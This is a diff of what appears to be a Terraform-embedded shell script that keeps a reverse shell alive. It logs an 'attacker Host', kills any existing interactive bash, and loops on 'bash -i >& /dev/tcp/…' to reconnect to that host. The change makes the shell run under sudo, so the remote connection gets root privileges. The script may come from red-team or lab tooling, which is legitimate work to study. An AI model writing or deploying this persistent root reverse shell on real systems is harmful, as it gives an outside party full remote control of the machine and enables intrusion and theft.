@@ -16,10 +16,10 @@ locals {
     truncate -s 0 $LOGFILE
     log "attacker Host: ${local.host_ip}:${local.host_port}"
     kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
-    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
+    log "running: sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
     
     log "reconnecting: ${local.host_ip}:${local.host_port}"
-    while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
+    while ! sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
         log "reconnecting: ${local.host_ip}:${local.host_port}";
         
         SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
